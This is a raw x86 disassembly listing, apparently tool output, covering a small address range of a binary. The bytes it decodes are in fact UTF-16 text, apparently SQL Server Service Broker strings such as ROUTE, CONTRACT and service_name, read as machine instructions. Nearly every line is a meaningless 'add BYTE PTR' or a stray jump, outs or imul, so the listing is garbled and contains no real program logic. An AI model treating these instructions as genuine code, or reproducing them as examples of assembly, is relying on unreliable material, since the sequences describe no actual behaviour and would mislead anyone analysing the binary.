  409726:	add    BYTE PTR [esi+0x0],cl
  409729:	dec    edi
  40972a:	add    BYTE PTR [edx+0x0],dl
  40972d:	inc    ebp
  40972e:	add    BYTE PTR [eax],ah
  409730:	add    BYTE PTR [ebp+0x0],ah
  409733:	jb     0x409735
  409735:	jb     0x409737
  409737:	outs   dx,DWORD PTR ds:[esi]
  409738:	add    BYTE PTR [edx+0x0],dh
  40973b:	pop    edi
  40973c:	add    BYTE PTR [ecx+0x0],ch
  40973f:	add    BYTE PTR fs:[ebp+0x0],bl
  409743:	and    BYTE PTR [eax],al
  409745:	pop    ebx
  409746:	add    BYTE PTR [esi],ch
  409748:	add    BYTE PTR [esi],ch
  40974a:	add    BYTE PTR [esi],ch
  40974c:	add    BYTE PTR [esi+0x0],ch
  40974f:	pop    ebp
  409750:	add    BYTE PTR ds:0x9000a00,cl
  409756:	add    BYTE PTR [ebx+0x0],bl
  409759:	cmp    al,0x0
  40975b:	inc    ebx
  40975c:	add    BYTE PTR [edi+0x0],ch
  40975f:	outs   dx,BYTE PTR ds:[esi]
  409760:	add    BYTE PTR [esi+0x0],ch
  409763:	add    BYTE PTR gs:[ebx+0x0],ah
  409767:	je     0x409769
  409769:	imul   eax,DWORD PTR [eax],0x6e006f
  40976f:	dec    edi
  409770:	add    BYTE PTR [eax+0x0],dh
  409773:	je     0x409775
  409775:	imul   eax,DWORD PTR [eax],0x6e006f
  40977b:	jae    0x40977d
  40977d:	add    BYTE PTR ds:[ebp+0x0],bl
  409781:	or     eax,0xd000a00
  409786:	add    BYTE PTR [edx],cl
  409788:	add    BYTE PTR [eax+eax*1],bh
  40978b:	inc    ebx
  40978c:	add    BYTE PTR [edi+0x0],ch
  40978f:	outs   dx,BYTE PTR ds:[esi]
  409790:	add    BYTE PTR [esi+0x0],ah
  409793:	imul   eax,DWORD PTR [eax],0x750067
  409799:	jb     0x40979b
  40979b:	popa   
  40979c:	add    BYTE PTR [eax+eax*1+0x69],dh
  4097a0:	add    BYTE PTR [edi+0x0],ch
  4097a3:	outs   dx,BYTE PTR ds:[esi]
  4097a4:	add    BYTE PTR [esi],bh
  4097a6:	add    BYTE PTR [eax],ah
  4097a8:	add    BYTE PTR [edx],bh
  4097aa:	add    BYTE PTR [edx],bh
  4097ac:	add    BYTE PTR ds:0xa000d00,bh
  4097b2:	add    BYTE PTR [ecx],cl
  4097b4:	add    BYTE PTR [ebx+0x0],al
  4097b7:	dec    edi
  4097b8:	add    BYTE PTR [esi+0x0],cl
  4097bb:	inc    esi
  4097bc:	add    BYTE PTR [ecx+0x0],cl
  4097bf:	inc    edi
  4097c0:	add    BYTE PTR [ebp+0x0],dl
  4097c3:	push   edx
  4097c4:	add    BYTE PTR [ecx+0x0],al
  4097c7:	push   esp
  4097c8:	add    BYTE PTR [ecx+0x0],cl
  4097cb:	dec    edi
  4097cc:	add    BYTE PTR [esi+0x0],cl
  4097cf:	and    BYTE PTR [eax],al
  4097d1:	and    BYTE PTR [eax],al
  4097d3:	jnp    0x4097d5
  4097d5:	cmp    al,0x0
  4097d7:	inc    esi
  4097d8:	add    BYTE PTR [edx+0x0],dh
  4097db:	outs   dx,DWORD PTR ds:[esi]
  4097dc:	add    BYTE PTR [ebp+0x0],ch
  4097df:	push   ebx
  4097e0:	add    BYTE PTR [ebp+0x0],ah
  4097e3:	jb     0x4097e5
  4097e5:	jbe    0x4097e7
  4097e7:	imul   eax,DWORD PTR [eax],0x650063
  4097ed:	add    BYTE PTR ds:[eax],ah
  4097f0:	add    BYTE PTR [eax+eax*1],bh
  4097f3:	push   esp
  4097f4:	add    BYTE PTR [edi+0x0],ch
  4097f7:	push   ebx
  4097f8:	add    BYTE PTR [ebp+0x0],ah
  4097fb:	jb     0x4097fd
  4097fd:	jbe    0x4097ff
  4097ff:	imul   eax,DWORD PTR [eax],0x650063
  409805:	add    BYTE PTR ds:[eax],ah
  409808:	add    BYTE PTR [eax+eax*1+0x20],bh
  40980c:	add    BYTE PTR [eax+eax*1],bh
  40980f:	inc    esi
  409810:	add    BYTE PTR [edx+0x0],dh
  409813:	outs   dx,DWORD PTR ds:[esi]
  409814:	add    BYTE PTR [ebp+0x0],ch
  409817:	push   ebx
  409818:	add    BYTE PTR [ebp+0x0],ah
  40981b:	jb     0x40981d
  40981d:	jbe    0x40981f
  40981f:	imul   eax,DWORD PTR [eax],0x650063
  409825:	add    BYTE PTR ds:[eax],ah
  409828:	add    BYTE PTR [eax+eax*1+0x20],bh
  40982c:	add    BYTE PTR [eax+eax*1],bh
  40982f:	push   esp
  409830:	add    BYTE PTR [edi+0x0],ch
  409833:	push   ebx
  409834:	add    BYTE PTR [ebp+0x0],ah
  409837:	jb     0x409839
  409839:	jbe    0x40983b
  40983b:	imul   eax,DWORD PTR [eax],0x650063
  409841:	add    BYTE PTR ds:[ebp+0x0],bh
  409845:	or     eax,0x9000a00
  40984a:	add    BYTE PTR [eax],ah
  40984c:	add    BYTE PTR [eax],ah
  40984e:	add    BYTE PTR [eax],ah
  409850:	add    BYTE PTR [eax],ah
  409852:	add    BYTE PTR [eax],ah
  409854:	add    BYTE PTR [eax],ah
  409856:	add    BYTE PTR [eax],ah
  409858:	add    BYTE PTR [eax],ah
  40985a:	add    BYTE PTR [eax],ah
  40985c:	add    BYTE PTR [eax],ah
  40985e:	add    BYTE PTR [eax],ah
  409860:	add    BYTE PTR [eax],ah
  409862:	add    BYTE PTR [eax],ah
  409864:	add    BYTE PTR [eax],ah
  409866:	add    BYTE PTR [eax],ah
  409868:	add    BYTE PTR [ebx+0x0],bh
  40986b:	and    BYTE PTR [eax],al
  40986d:	dec    edi
  40986e:	add    BYTE PTR [esi+0x0],cl
  409871:	and    BYTE PTR [eax],al
  409873:	inc    ebx
  409874:	add    BYTE PTR [edi+0x0],cl
  409877:	dec    esi
  409878:	add    BYTE PTR [eax+eax*1+0x52],dl
  40987c:	add    BYTE PTR [ecx+0x0],al
  40987f:	inc    ebx
  409880:	add    BYTE PTR [eax+eax*1+0x20],dl
  409884:	add    BYTE PTR [ebx+0x0],ah
  409887:	outs   dx,DWORD PTR ds:[esi]
  409888:	add    BYTE PTR [esi+0x0],ch
  40988b:	je     0x40988d
  40988d:	jb     0x40988f
  40988f:	popa   
  409890:	add    BYTE PTR [ebx+0x0],ah
  409893:	je     0x409895
  409895:	pop    edi
  409896:	add    BYTE PTR [esi+0x0],ch
  409899:	popa   
  40989a:	add    BYTE PTR [ebp+0x0],ch
  40989d:	add    BYTE PTR gs:[eax],ah
  4098a0:	add    BYTE PTR [ebp+0x0],bh
  4098a3:	or     eax,0x9000a00
  4098a8:	add    BYTE PTR [eax],ah
  4098aa:	add    BYTE PTR [eax],ah
  4098ac:	add    BYTE PTR [eax],ah
  4098ae:	add    BYTE PTR [eax],ah
  4098b0:	add    BYTE PTR [eax],ah
  4098b2:	add    BYTE PTR [eax],ah
  4098b4:	add    BYTE PTR [eax],ah
  4098b6:	add    BYTE PTR [eax],ah
  4098b8:	add    BYTE PTR [eax],ah
  4098ba:	add    BYTE PTR [eax],ah
  4098bc:	add    BYTE PTR [eax],ah
  4098be:	add    BYTE PTR [eax],ah
  4098c0:	add    BYTE PTR [eax],ah
  4098c2:	add    BYTE PTR [eax],ah
  4098c4:	add    BYTE PTR [eax],ah
  4098c6:	add    BYTE PTR [ebx+0x0],bl
  4098c9:	and    BYTE PTR [eax],al
  4098cb:	inc    ebp
  4098cc:	add    BYTE PTR [esi+0x0],cl
  4098cf:	inc    ebx
  4098d0:	add    BYTE PTR [edx+0x0],dl
  4098d3:	pop    ecx
  4098d4:	add    BYTE PTR [eax+0x0],dl
  4098d7:	push   esp
  4098d8:	add    BYTE PTR [ecx+0x0],cl
  4098db:	dec    edi
  4098dc:	add    BYTE PTR [esi+0x0],cl
  4098df:	and    BYTE PTR [eax],al
  4098e1:	jnp    0x4098e3
  4098e3:	dec    edi
  4098e4:	add    BYTE PTR [esi+0x0],cl
  4098e7:	and    BYTE PTR [eax],al
  4098e9:	jl     0x4098eb
  4098eb:	and    BYTE PTR [eax],al
  4098ed:	dec    edi
  4098ee:	add    BYTE PTR [esi+0x0],al
  4098f1:	inc    esi
  4098f2:	add    BYTE PTR [eax],ah
  4098f4:	add    BYTE PTR [eax+eax*1+0x20],bh
  4098f8:	add    BYTE PTR [ecx+0x0],al
  4098fb:	dec    esi
  4098fc:	add    BYTE PTR [edi+0x0],cl
  4098ff:	dec    esi
  409900:	add    BYTE PTR [ecx+0x0],bl
  409903:	dec    ebp
  409904:	add    BYTE PTR [edi+0x0],cl
  409907:	push   ebp
  409908:	add    BYTE PTR [ebx+0x0],dl
  40990b:	jge    0x40990d
  40990d:	and    BYTE PTR [eax],al
  40990f:	pop    ebp
  409910:	add    BYTE PTR ds:0xd000a00,cl
  409916:	add    BYTE PTR [edx],cl
  409918:	add    BYTE PTR [eax+eax*1],bh
  40991b:	push   edx
  40991c:	add    BYTE PTR [ebp+0x0],dh
  40991f:	outs   dx,BYTE PTR ds:[esi]
  409920:	add    BYTE PTR [eax+eax*1+0x69],dh
  409924:	add    BYTE PTR [ebp+0x0],ch
  409927:	add    BYTE PTR gs:[esi],bh
  40992a:	add    BYTE PTR [eax],ah
  40992c:	add    BYTE PTR [edx],bh
  40992e:	add    BYTE PTR [edx],bh
  409930:	add    BYTE PTR ds:0xa000d00,bh
  409936:	add    BYTE PTR [eax],ah
  409938:	add    BYTE PTR [eax],ah
  40993a:	add    BYTE PTR [eax],ah
  40993c:	add    BYTE PTR [eax],ah
  40993e:	add    BYTE PTR [eax],ah
  409940:	add    BYTE PTR [eax],ah
  409942:	add    BYTE PTR [eax],ah
  409944:	add    BYTE PTR [eax],ah
  409946:	add    BYTE PTR [edx+0x0],dl
  409949:	push   ebp
  40994a:	add    BYTE PTR [esi+0x0],cl
  40994d:	push   esp
  40994e:	add    BYTE PTR [ecx+0x0],cl
  409951:	dec    ebp
  409952:	add    BYTE PTR [ebp+0x0],al
  409955:	and    BYTE PTR [eax],al
  409957:	or     eax,0x20000a00
  40995c:	add    BYTE PTR [eax],ah
  40995e:	add    BYTE PTR [eax],ah
  409960:	add    BYTE PTR [eax],ah
  409962:	add    BYTE PTR [eax],ah
  409964:	add    BYTE PTR [eax],ah
  409966:	add    BYTE PTR [eax],ah
  409968:	add    BYTE PTR [eax],ah
  40996a:	add    BYTE PTR [ebx+0x0],bl
  40996d:	sub    eax,0x48005300
  409972:	add    BYTE PTR [edi+0x0],cl
  409975:	push   edi
  409976:	add    BYTE PTR [ebp+0x0],al
  409979:	push   esi
  40997a:	add    BYTE PTR [ebp+0x0],al
  40997d:	dec    esi
  40997e:	add    BYTE PTR [eax+eax*1+0x53],dl
  409982:	add    BYTE PTR [ebp+0x0],bl
  409985:	or     eax,0x20000a00
  40998a:	add    BYTE PTR [eax],ah
  40998c:	add    BYTE PTR [eax],ah
  40998e:	add    BYTE PTR [eax],ah
  409990:	add    BYTE PTR [eax],ah
  409992:	add    BYTE PTR [eax],ah
  409994:	add    BYTE PTR [eax],ah
  409996:	add    BYTE PTR [eax],ah
  409998:	add    BYTE PTR [ebx+0x0],bl
  40999b:	or     eax,0x20000a00
  4099a0:	add    BYTE PTR [eax],ah
  4099a2:	add    BYTE PTR [eax],ah
  4099a4:	add    BYTE PTR [eax],ah
  4099a6:	add    BYTE PTR [eax],ah
  4099a8:	add    BYTE PTR [eax],ah
  4099aa:	add    BYTE PTR [eax],ah
  4099ac:	add    BYTE PTR [eax],ah
  4099ae:	add    BYTE PTR [eax],ah
  4099b0:	add    BYTE PTR [eax],ah
  4099b2:	add    BYTE PTR [eax],ah
  4099b4:	add    BYTE PTR [eax],ah
  4099b6:	add    BYTE PTR [ebx+0x0],bl
  4099b9:	sub    eax,0x45004e00
  4099be:	add    BYTE PTR [edi+0x0],dl
  4099c1:	pop    ebp
  4099c2:	add    BYTE PTR [eax],ah
  4099c4:	add    BYTE PTR [eax+eax*1+0x20],bh
  4099c8:	add    BYTE PTR ds:0x20000a00,cl
  4099ce:	add    BYTE PTR [eax],ah
  4099d0:	add    BYTE PTR [eax],ah
  4099d2:	add    BYTE PTR [eax],ah
  4099d4:	add    BYTE PTR [eax],ah
  4099d6:	add    BYTE PTR [eax],ah
  4099d8:	add    BYTE PTR [eax],ah
  4099da:	add    BYTE PTR [eax],ah
  4099dc:	add    BYTE PTR [eax],ah
  4099de:	add    BYTE PTR [eax],ah
  4099e0:	add    BYTE PTR [eax],ah
  4099e2:	add    BYTE PTR [eax],ah
  4099e4:	add    BYTE PTR [ebx+0x0],bl
  4099e7:	sub    eax,0x44004900
  4099ec:	add    BYTE PTR [eax],ah
  4099ee:	add    BYTE PTR [ebx+0x0],bh
  4099f1:	and    BYTE PTR [eax],al
  4099f3:	arpl   WORD PTR [eax],ax
  4099f5:	outs   dx,DWORD PTR ds:[esi]
  4099f6:	add    BYTE PTR [esi+0x0],ch
  4099f9:	jbe    0x4099fb
  4099fb:	add    BYTE PTR gs:[edx+0x0],dh
  4099ff:	jae    0x409a01
  409a01:	popa   
  409a02:	add    BYTE PTR [eax+eax*1+0x69],dh
  409a06:	add    BYTE PTR [edi+0x0],ch
  409a09:	outs   dx,BYTE PTR ds:[esi]
  409a0a:	add    BYTE PTR [edi+0x0],bl
  409a0d:	push   0x6e006100
  409a12:	add    BYTE PTR [eax+eax*1+0x6c],ah
  409a16:	add    BYTE PTR [ebp+0x0],ah
  409a19:	and    BYTE PTR [eax],al
  409a1b:	jl     0x409a1d
  409a1d:	and    BYTE PTR [eax],al
  409a1f:	arpl   WORD PTR [eax],ax
  409a21:	outs   dx,DWORD PTR ds:[esi]
  409a22:	add    BYTE PTR [esi+0x0],ch
  409a25:	jbe    0x409a27
  409a27:	add    BYTE PTR gs:[edx+0x0],dh
  409a2b:	jae    0x409a2d
  409a2d:	popa   
  409a2e:	add    BYTE PTR [eax+eax*1+0x69],dh
  409a32:	add    BYTE PTR [edi+0x0],ch
  409a35:	outs   dx,BYTE PTR ds:[esi]
  409a36:	add    BYTE PTR [edi+0x0],bl
  409a39:	imul   eax,DWORD PTR [eax],0x200064
  409a3f:	jl     0x409a41
  409a41:	and    BYTE PTR [eax],al
  409a43:	or     eax,0x20000a00
  409a48:	add    BYTE PTR [eax],ah
  409a4a:	add    BYTE PTR [eax],ah
  409a4c:	add    BYTE PTR [eax],ah
  409a4e:	add    BYTE PTR [eax],ah
  409a50:	add    BYTE PTR [eax],ah
  409a52:	add    BYTE PTR [eax],ah
  409a54:	add    BYTE PTR [eax],ah
  409a56:	add    BYTE PTR [eax],ah
  409a58:	add    BYTE PTR [eax],ah
  409a5a:	add    BYTE PTR [eax],ah
  409a5c:	add    BYTE PTR [eax],ah
  409a5e:	add    BYTE PTR [eax],ah
  409a60:	add    BYTE PTR [eax],ah
  409a62:	add    BYTE PTR [eax],ah
  409a64:	add    BYTE PTR [eax],ah
  409a66:	add    BYTE PTR [eax],ah
  409a68:	add    BYTE PTR [eax],ah
  409a6a:	add    BYTE PTR [eax],ah
  409a6c:	add    BYTE PTR [ebx+0x0],ah
  409a6f:	outs   dx,DWORD PTR ds:[esi]
  409a70:	add    BYTE PTR [esi+0x0],ch
  409a73:	jbe    0x409a75
  409a75:	add    BYTE PTR gs:[edx+0x0],dh
  409a79:	jae    0x409a7b
  409a7b:	popa   
  409a7c:	add    BYTE PTR [eax+eax*1+0x69],dh
  409a80:	add    BYTE PTR [edi+0x0],ch
  409a83:	outs   dx,BYTE PTR ds:[esi]
  409a84:	add    BYTE PTR [edi+0x0],bl
  409a87:	add    BYTE PTR [bp+si+0x0],dh
  409a8b:	outs   dx,DWORD PTR ds:[esi]
  409a8c:	add    BYTE PTR [ebp+0x0],dh
  409a8f:	jo     0x409a91
  409a91:	pop    edi
  409a92:	add    BYTE PTR [ecx+0x0],ch
  409a95:	add    BYTE PTR fs:[eax],ah
  409a98:	add    BYTE PTR [ebp+0x0],bh
  409a9b:	pop    ebp
  409a9c:	add    BYTE PTR [eax],ah
  409a9e:	add    BYTE PTR [ebx+0x0],bl
  409aa1:	add    BYTE PTR cs:[esi],ch
  409aa4:	add    BYTE PTR [esi],ch
  409aa6:	add    BYTE PTR [esi+0x0],ch
  409aa9:	pop    ebp
  409aaa:	add    BYTE PTR ds:0x20000a00,cl
  409ab0:	add    BYTE PTR [eax],ah
  409ab2:	add    BYTE PTR [eax],ah
  409ab4:	add    BYTE PTR [eax],ah
  409ab6:	add    BYTE PTR [eax],ah
  409ab8:	add    BYTE PTR [eax],ah
  409aba:	add    BYTE PTR [eax],ah
  409abc:	add    BYTE PTR [eax],ah
  409abe:	add    BYTE PTR [ebp+0x0],bl
  409ac1:	or     eax,0x20000a00
  409ac6:	add    BYTE PTR [eax],ah
  409ac8:	add    BYTE PTR [eax],ah
  409aca:	add    BYTE PTR [eax],ah
  409acc:	add    BYTE PTR [eax],ah
  409ace:	add    BYTE PTR [eax],ah
  409ad0:	add    BYTE PTR [eax],ah
  409ad2:	add    BYTE PTR [eax],ah
  409ad4:	add    BYTE PTR [ebx+0x0],bl
  409ad7:	sub    eax,0x49005400
  409adc:	add    BYTE PTR [ebp+0x0],cl
  409adf:	inc    ebp
  409ae0:	add    BYTE PTR [edi+0x0],cl
  409ae3:	push   ebp
  409ae4:	add    BYTE PTR [eax+eax*1+0x20],dl
  409ae8:	add    BYTE PTR [eax+eax*1+0x69],dh
  409aec:	add    BYTE PTR [ebp+0x0],ch
  409aef:	add    BYTE PTR gs:[edi+0x0],ch
  409af3:	jne    0x409af5
  409af5:	je     0x409af7
  409af7:	pop    edi
  409af8:	add    BYTE PTR [ecx+0x0],ch
  409afb:	outs   dx,BYTE PTR ds:[esi]
  409afc:	add    BYTE PTR [eax+eax*1+0x65],dh
  409b00:	add    BYTE PTR [edx+0x0],dh
  409b03:	jbe    0x409b05
  409b05:	popa   
  409b06:	add    BYTE PTR [eax+eax*1+0x5d],ch
  409b0a:	add    BYTE PTR ds:0x20000a00,cl
  409b10:	add    BYTE PTR [eax],ah
  409b12:	add    BYTE PTR [eax],ah
  409b14:	add    BYTE PTR [eax],ah
  409b16:	add    BYTE PTR [eax],ah
  409b18:	add    BYTE PTR [eax],ah
  409b1a:	add    BYTE PTR [eax],ah
  409b1c:	add    BYTE PTR [eax],ah
  409b1e:	add    BYTE PTR [ebx+0x0],bl
  409b21:	cmp    al,0x0
  409b23:	push   edx
  409b24:	add    BYTE PTR [ebp+0x0],dh
  409b27:	outs   dx,BYTE PTR ds:[esi]
  409b28:	add    BYTE PTR [eax+eax*1+0x69],dh
  409b2c:	add    BYTE PTR [ebp+0x0],ch
  409b2f:	add    BYTE PTR gs:[ebx+0x0],al
  409b33:	outs   dx,DWORD PTR ds:[esi]
  409b34:	add    BYTE PTR [esi+0x0],ch
  409b37:	outs   dx,BYTE PTR ds:[esi]
  409b38:	add    BYTE PTR [ebp+0x0],ah
  409b3b:	arpl   WORD PTR [eax],ax
  409b3d:	je     0x409b3f
  409b3f:	imul   eax,DWORD PTR [eax],0x6e006f
  409b45:	dec    edi
  409b46:	add    BYTE PTR [eax+0x0],dh
  409b49:	je     0x409b4b
  409b4b:	imul   eax,DWORD PTR [eax],0x6e006f
  409b51:	jae    0x409b53
  409b53:	add    BYTE PTR ds:[ebp+0x0],bl
  409b57:	or     eax,0xd000a00
  409b5c:	add    BYTE PTR [edx],cl
  409b5e:	add    BYTE PTR [eax+eax*1],bh
  409b61:	inc    esi
  409b62:	add    BYTE PTR [edx+0x0],dh
  409b65:	outs   dx,DWORD PTR ds:[esi]
  409b66:	add    BYTE PTR [ebp+0x0],ch
  409b69:	push   ebx
  409b6a:	add    BYTE PTR [ebp+0x0],ah
  409b6d:	jb     0x409b6f
  409b6f:	jbe    0x409b71
  409b71:	imul   eax,DWORD PTR [eax],0x650063
  409b77:	add    BYTE PTR ds:[eax],ah
  409b7a:	add    BYTE PTR [edx],bh
  409b7c:	add    BYTE PTR [edx],bh
  409b7e:	add    BYTE PTR ds:0xa000d00,bh
  409b84:	add    BYTE PTR [ecx],cl
  409b86:	add    BYTE PTR [esi+0x0],al
  409b89:	push   edx
  409b8a:	add    BYTE PTR [edi+0x0],cl
  409b8d:	dec    ebp
  409b8e:	add    BYTE PTR [eax],ah
  409b90:	add    BYTE PTR [ebx+0x0],dl
  409b93:	inc    ebp
  409b94:	add    BYTE PTR [edx+0x0],dl
  409b97:	push   esi
  409b98:	add    BYTE PTR [ecx+0x0],cl
  409b9b:	inc    ebx
  409b9c:	add    BYTE PTR [ebp+0x0],al
  409b9f:	and    BYTE PTR [eax],al
  409ba1:	jae    0x409ba3
  409ba3:	add    BYTE PTR gs:[edx+0x0],dh
  409ba7:	jbe    0x409ba9
  409ba9:	imul   eax,DWORD PTR [eax],0x650063
  409baf:	pop    edi
  409bb0:	add    BYTE PTR [esi+0x0],ch
  409bb3:	popa   
  409bb4:	add    BYTE PTR [ebp+0x0],ch
  409bb7:	add    BYTE PTR gs:[eax],ah
  409bba:	add    BYTE PTR [ebx+0x0],bl
  409bbd:	cmp    al,0x0
  409bbf:	inc    ebx
  409bc0:	add    BYTE PTR [edi+0x0],ch
  409bc3:	outs   dx,BYTE PTR ds:[esi]
  409bc4:	add    BYTE PTR [esi+0x0],ch
  409bc7:	add    BYTE PTR gs:[ebx+0x0],ah
  409bcb:	je     0x409bcd
  409bcd:	imul   eax,DWORD PTR [eax],0x6e006f
  409bd3:	dec    edi
  409bd4:	add    BYTE PTR [eax+0x0],dh
  409bd7:	je     0x409bd9
  409bd9:	imul   eax,DWORD PTR [eax],0x6e006f
  409bdf:	jae    0x409be1
  409be1:	add    BYTE PTR ds:[ebp+0x0],bl
  409be5:	and    BYTE PTR [eax],al
  409be7:	pop    ebx
  409be8:	add    BYTE PTR [eax+eax*1],bh
  409beb:	dec    ebp
  409bec:	add    BYTE PTR [ecx+0x0],ch
  409bef:	jb     0x409bf1
  409bf1:	jb     0x409bf3
  409bf3:	outs   dx,DWORD PTR ds:[esi]
  409bf4:	add    BYTE PTR [edx+0x0],dh
  409bf7:	dec    edi
  409bf8:	add    BYTE PTR [eax+0x0],dh
  409bfb:	je     0x409bfd
  409bfd:	imul   eax,DWORD PTR [eax],0x6e006f
  409c03:	jae    0x409c05
  409c05:	add    BYTE PTR ds:[ebp+0x0],bl
  409c09:	or     eax,0xd000a00
  409c0e:	add    BYTE PTR [edx],cl
  409c10:	add    BYTE PTR [eax+eax*1],bh
  409c13:	push   esp
  409c14:	add    BYTE PTR [edi+0x0],ch
  409c17:	push   ebx
  409c18:	add    BYTE PTR [ebp+0x0],ah
  409c1b:	jb     0x409c1d
  409c1d:	jbe    0x409c1f
  409c1f:	imul   eax,DWORD PTR [eax],0x650063
  409c25:	add    BYTE PTR ds:[eax],ah
  409c28:	add    BYTE PTR [edx],bh
  409c2a:	add    BYTE PTR [edx],bh
  409c2c:	add    BYTE PTR ds:0xa000d00,bh
  409c32:	add    BYTE PTR [ecx],cl
  409c34:	add    BYTE PTR [eax+eax*1+0x4f],dl
  409c38:	add    BYTE PTR [eax],ah
  409c3a:	add    BYTE PTR [ebx+0x0],dl
  409c3d:	inc    ebp
  409c3e:	add    BYTE PTR [edx+0x0],dl
  409c41:	push   esi
  409c42:	add    BYTE PTR [ecx+0x0],cl
  409c45:	inc    ebx
  409c46:	add    BYTE PTR [ebp+0x0],al
  409c49:	and    BYTE PTR [eax],al
  409c4b:	jae    0x409c4d
  409c4d:	add    BYTE PTR gs:[edx+0x0],dh
  409c51:	jbe    0x409c53
  409c53:	imul   eax,DWORD PTR [eax],0x650063
  409c59:	pop    edi
  409c5a:	add    BYTE PTR [esi+0x0],ch
  409c5d:	popa   
  409c5e:	add    BYTE PTR [ebp+0x0],ch
  409c61:	add    BYTE PTR gs:[eax],ah
  409c64:	add    BYTE PTR [ebx+0x0],bl
  409c67:	sub    al,0x0
  409c69:	bound  eax,QWORD PTR [eax]
  409c6b:	jb     0x409c6d
  409c6d:	outs   dx,DWORD PTR ds:[esi]
  409c6e:	add    BYTE PTR [ebx+0x0],ch
  409c71:	add    BYTE PTR gs:[edx+0x0],dh
  409c75:	pop    edi
  409c76:	add    BYTE PTR [ecx+0x0],ch
  409c79:	add    BYTE PTR fs:[ebp+0x0],bl
  409c7d:	or     eax,0x9000a00
  409c82:	add    BYTE PTR [ebx+0x0],bl
  409c85:	cmp    al,0x0
  409c87:	inc    ebx
  409c88:	add    BYTE PTR [edi+0x0],ch
  409c8b:	outs   dx,BYTE PTR ds:[esi]
  409c8c:	add    BYTE PTR [esi+0x0],ch
  409c8f:	add    BYTE PTR gs:[ebx+0x0],ah
  409c93:	je     0x409c95
  409c95:	imul   eax,DWORD PTR [eax],0x6e006f
  409c9b:	dec    edi
  409c9c:	add    BYTE PTR [eax+0x0],dh
  409c9f:	je     0x409ca1
  409ca1:	imul   eax,DWORD PTR [eax],0x6e006f
  409ca7:	jae    0x409ca9
  409ca9:	add    BYTE PTR ds:[ebp+0x0],bl
  409cad:	and    BYTE PTR [eax],al
  409caf:	pop    ebx
  409cb0:	add    BYTE PTR [eax+eax*1],bh
  409cb3:	dec    ebp
  409cb4:	add    BYTE PTR [ecx+0x0],ch
  409cb7:	jb     0x409cb9
  409cb9:	jb     0x409cbb
  409cbb:	outs   dx,DWORD PTR ds:[esi]
  409cbc:	add    BYTE PTR [edx+0x0],dh
  409cbf:	dec    edi
  409cc0:	add    BYTE PTR [eax+0x0],dh
  409cc3:	je     0x409cc5
  409cc5:	imul   eax,DWORD PTR [eax],0x6e006f
  409ccb:	jae    0x409ccd
  409ccd:	add    BYTE PTR ds:[ebp+0x0],bl
  409cd1:	or     eax,0xd000a00
  409cd6:	add    BYTE PTR [edx],cl
  409cd8:	add    BYTE PTR [eax+eax*1],bh
  409cdb:	dec    ebp
  409cdc:	add    BYTE PTR [ecx+0x0],ch
  409cdf:	jb     0x409ce1
  409ce1:	jb     0x409ce3
  409ce3:	outs   dx,DWORD PTR ds:[esi]
  409ce4:	add    BYTE PTR [edx+0x0],dh
  409ce7:	dec    edi
  409ce8:	add    BYTE PTR [eax+0x0],dh
  409ceb:	je     0x409ced
  409ced:	imul   eax,DWORD PTR [eax],0x6e006f
  409cf3:	jae    0x409cf5
  409cf5:	add    BYTE PTR ds:[eax],ah
  409cf8:	add    BYTE PTR [edx],bh
  409cfa:	add    BYTE PTR [edx],bh
  409cfc:	add    BYTE PTR ds:0xa000d00,bh
  409d02:	add    BYTE PTR [ecx],cl
  409d04:	add    BYTE PTR [ebp+0x0],cl
  409d07:	dec    ecx
  409d08:	add    BYTE PTR [edx+0x0],dl
  409d0b:	push   edx
  409d0c:	add    BYTE PTR [edi+0x0],cl
  409d0f:	push   edx
  409d10:	add    BYTE PTR [eax],ah
  409d12:	add    BYTE PTR [eax+eax*1],bh
  409d15:	inc    ebx
  409d16:	add    BYTE PTR [edi+0x0],ch
  409d19:	outs   dx,BYTE PTR ds:[esi]
  409d1a:	add    BYTE PTR [esi+0x0],ch
  409d1d:	add    BYTE PTR gs:[ebx+0x0],ah
  409d21:	je     0x409d23
  409d23:	imul   eax,DWORD PTR [eax],0x6e006f
  409d29:	dec    edi
  409d2a:	add    BYTE PTR [eax+0x0],dh
  409d2d:	je     0x409d2f
  409d2f:	imul   eax,DWORD PTR [eax],0x6e006f
  409d35:	jae    0x409d37
  409d37:	add    BYTE PTR ds:0xd000a00,cl
  409d3e:	add    BYTE PTR [edx],cl
  409d40:	add    BYTE PTR [eax+eax*1],bh
  409d43:	push   edx
  409d44:	add    BYTE PTR [ebp+0x0],dh
  409d47:	outs   dx,BYTE PTR ds:[esi]
  409d48:	add    BYTE PTR [eax+eax*1+0x69],dh
  409d4c:	add    BYTE PTR [ebp+0x0],ch
  409d4f:	add    BYTE PTR gs:[ebx+0x0],al
  409d53:	outs   dx,DWORD PTR ds:[esi]
  409d54:	add    BYTE PTR [esi+0x0],ch
  409d57:	outs   dx,BYTE PTR ds:[esi]
  409d58:	add    BYTE PTR [ebp+0x0],ah
  409d5b:	arpl   WORD PTR [eax],ax
  409d5d:	je     0x409d5f
  409d5f:	imul   eax,DWORD PTR [eax],0x6e006f
  409d65:	dec    edi
  409d66:	add    BYTE PTR [eax+0x0],dh
  409d69:	je     0x409d6b
  409d6b:	imul   eax,DWORD PTR [eax],0x6e006f
  409d71:	jae    0x409d73
  409d73:	add    BYTE PTR ds:[eax],ah
  409d76:	add    BYTE PTR [edx],bh
  409d78:	add    BYTE PTR [edx],bh
  409d7a:	add    BYTE PTR ds:0xa000d00,bh
  409d80:	add    BYTE PTR [eax],ah
  409d82:	add    BYTE PTR [eax],ah
  409d84:	add    BYTE PTR [eax],ah
  409d86:	add    BYTE PTR [eax],ah
  409d88:	add    BYTE PTR [eax],ah
  409d8a:	add    BYTE PTR [eax],ah
  409d8c:	add    BYTE PTR [eax],ah
  409d8e:	add    BYTE PTR [eax],ah
  409d90:	add    BYTE PTR [ebx+0x0],bl
  409d93:	and    BYTE PTR [eax],al
  409d95:	inc    ebx
  409d96:	add    BYTE PTR [edi+0x0],cl
  409d99:	dec    esi
  409d9a:	add    BYTE PTR [esi+0x0],cl
  409d9d:	inc    ebp
  409d9e:	add    BYTE PTR [ebx+0x0],al
  409da1:	push   esp
  409da2:	add    BYTE PTR [eax],ah
  409da4:	add    BYTE PTR [eax+eax*1+0x4f],dl
  409da8:	add    BYTE PTR [eax],ah
  409daa:	add    BYTE PTR [eax+eax*1],bh
  409dad:	inc    ebx
  409dae:	add    BYTE PTR [edi+0x0],ch
  409db1:	outs   dx,BYTE PTR ds:[esi]
  409db2:	add    BYTE PTR [esi+0x0],ch
  409db5:	add    BYTE PTR gs:[ebx+0x0],ah
  409db9:	je     0x409dbb
